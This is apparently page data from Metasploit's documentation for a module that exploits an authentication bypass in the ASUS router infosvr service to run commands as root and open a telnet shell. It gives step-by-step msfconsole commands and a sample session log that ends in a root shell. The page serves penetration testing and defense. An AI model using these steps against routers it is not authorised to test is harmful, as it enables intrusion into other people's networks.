{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/misc/asus_infosvr_auth_bypass_exec","result":{"data":{"moduleMetadataJson":{"id":"11ef4f80-9549-5035-8b98-39fbc9c7abde","name":"ASUS infosvr Auth Bypass Command Execution","fullname":"exploit/linux/misc/asus_infosvr_auth_bypass_exec","description":"This module exploits an authentication bypass vulnerability in the\n        infosvr service running on UDP port 9999 on various ASUS routers to\n        execute arbitrary commands as root.\n\n        This module launches the BusyBox Telnet daemon on the port specified\n        in the TelnetPort option to gain an interactive remote shell.\n\n        This module was tested successfully on an ASUS RT-N12E with firmware\n        version 2.0.0.35.\n\n        Numerous ASUS models are reportedly affected, but untested.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/misc/asus_infosvr_auth_bypass_exec","documentationSlug":"/modules/documentation/exploit/linux/misc/asus_infosvr_auth_bypass_exec"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>  This module exploits an authentication bypass vulnerability in the infosvr service running on various ASUS routers to execute arbitrary commands as <code class=\"language-text\">root</code>.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  The ASUS infosvr service is enabled by default on various models of ASUS routers and listens on the LAN interface on UDP port 9999. Unpatched versions of this service allow unauthenticated remote command execution as the <code class=\"language-text\">root</code> user.</p>\n<p>  This module launches the BusyBox Telnet daemon on the port specified in the <code class=\"language-text\">TelnetPort</code> option to gain an interactive remote shell.</p>\n<p>  This module was tested successfully on an ASUS RT-N12E with firmware version 2.0.0.35.</p>\n<p>  Numerous ASUS models are <a href=\"https://github.com/jduck/asus-cmd\">reportedly affected</a>, but untested.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li><code class=\"language-text\">use exploit/linux/misc/asus_infosvr_auth_bypass_exec</code></li>\n<li><code class=\"language-text\">set RHOST [IP]</code></li>\n<li><code class=\"language-text\">run</code></li>\n<li>You should get a <em>root</em> session</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>TelnetPort</strong></p>\n<p>  The port for Telnetd to bind (default: <code class=\"language-text\">4444</code>)</p>\n<p>  <strong>TelnetTimeout</strong></p>\n<p>  The number of seconds to wait for connection to telnet (default: <code class=\"language-text\">10</code>)</p>\n<p>  <strong>TelnetBannerTimeout</strong></p>\n<p>  The number of seconds to wait for the telnet banner (default: <code class=\"language-text\">25</code>)</p>\n<p>  <strong>CommandShellCleanupCommand</strong></p>\n<p>  A command to run before the session is closed (default: <code class=\"language-text\">exit</code>)</p>\n<p>  If the session is killed (CTRL+C) rather than exiting cleanly,\nthe telnet port remains open, but is unresponsive, and prevents\nre-exploitation until the device is rebooted.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/linux/misc/asus_infosvr_auth_bypass_exec\nmsf exploit(linux/misc/asus_infosvr_auth_bypass_exec) &gt; set rhost 10.1.1.1\nrhost =&gt; 10.1.1.1\nmsf exploit(linux/misc/asus_infosvr_auth_bypass_exec) &gt; set telnetport 4444\ntelnetport =&gt; 4444\nmsf exploit(linux/misc/asus_infosvr_auth_bypass_exec) &gt; set verbose true\nverbose =&gt; true\nmsf exploit(linux/misc/asus_infosvr_auth_bypass_exec) &gt; run \n\n[*] 10.1.1.1 - Starting telnetd on port 4444...\n[*] 10.1.1.1 - Waiting for telnet service to start on port 4444...\n[*] 10.1.1.1 - Connecting to 10.1.1.1:4444...\n[*] 10.1.1.1 - Trying to establish a telnet session...\n[+] 10.1.1.1 - Telnet session successfully established...\n[*] Found shell.\n[*] Command shell session 1 opened (10.1.1.197:42875 -&gt; 10.1.1.1:4444) at 2017-11-28 07:38:37 -0500\n\nid\n/bin/sh: id: not found\n# cat /proc/version\ncat /proc/version\nLinux version 2.6.30.9 (root@wireless-desktop) (gcc version 3.4.6-1.3.6) #2 Thu Sep 18 18:12:23 CST 2014\n# exit\nexit</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"11ef4f80-9549-5035-8b98-39fbc9c7abde"}}}